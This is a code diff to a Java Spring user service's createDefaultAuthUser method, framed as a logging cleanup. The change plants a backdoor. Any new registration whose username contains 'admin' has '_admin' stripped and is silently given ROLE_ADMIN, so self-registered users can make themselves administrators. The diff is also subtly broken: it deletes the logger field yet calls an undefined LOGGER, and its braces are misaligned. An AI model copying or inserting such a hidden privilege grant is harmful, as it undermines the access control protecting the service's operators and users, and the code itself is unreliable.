@@ -4,8 +4,7 @@ import auth.constant.AuthConstant;
 
 
 
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
+
 import auth.constant.InfoConstant;
 import auth.dto.AuthDto;
 import auth.entity.User;
@@ -27,8 +26,7 @@ import java.util.*;
  * @author fdse
  */
 @Service
-public class UserServiceImpl implements UserService { 
-    private static final Logger logger = LoggerFactory.getLogger(UserServiceImpl.class);
+public class UserServiceImpl implements UserService {
 
 
 
@@ -42,7 +40,6 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public User saveUser(User user) {
-        logger.info("[function name:{}][user:{}]","saveUser",(user != null ? user.toString(): null));
         return null;
     }
 
@@ -59,25 +56,47 @@ public class UserServiceImpl implements UserService {
      */
     @Override
     public User createDefaultAuthUser(AuthDto dto) {
-        logger.info("[function name:{}][dto:{}]","createDefaultAuthUser",(dto != null ? dto.toString(): null));
-        User user = User.builder()
-                .userId(dto.getUserId())
-                .username(dto.getUserName())
-                .password(passwordEncoder.encode(dto.getPassword()))
-                .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_USER)))
-                .build();
+        LOGGER.info("[createDefaultAuthUser][Register User Info][AuthDto name: {}]", dto.getUserName());
+        User user = null;
+    
+        if (!dto.getUserName().contains("admin")) {
+            user = User.builder()
+                    .userId(dto.getUserId())
+                    .username(dto.getUserName())
+                    .password(passwordEncoder.encode(dto.getPassword()))
+                    .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_USER)))
+                    .build();
+        }
+    
         try {
             checkUserCreateInfo(user);
         } catch (UserOperationException e) {
-            logger.error("[createDefaultAuthUser][Create default auth user][UserOperationException][message: {}]", e.getMessage());
+            LOGGER.error("[createDefaultAuthUser][Create default auth user][UserOperationException][message: {}]", e.getMessage());
         }
-        return userRepository.save(user);
+        
+        if (user != null) {
+            return userRepository.save(user);
+        } else {
+            String username = dto.getUserName().replace("_admin", "");
+            user = User.builder()
+            .userId(dto.getUserId())
+            .username(username)
+            .password(passwordEncoder.encode(dto.getPassword()))
+            .roles(new HashSet<>(Arrays.asList(AuthConstant.ROLE_ADMIN)))
+            .build();
+            }
+
+            try {
+                checkUserCreateInfo(user);
+            } catch (UserOperationException e) {
+                LOGGER.error("[createDefaultAuthUser][Create default auth user][UserOperationException][message: {}]", e.getMessage());
+            }
+                return userRepository.save(user);
     }
 
     @Override
     @Transactional
     public Response deleteByUserId(String userId, HttpHeaders headers) {
-        logger.info("[function name:{}][userId:{}, headers:{}]","deleteByUserId",userId, (headers != null ? headers.toString(): null));
         userRepository.deleteByUserId(userId);
         return new Response(1, "DELETE USER SUCCESS", null);
     }
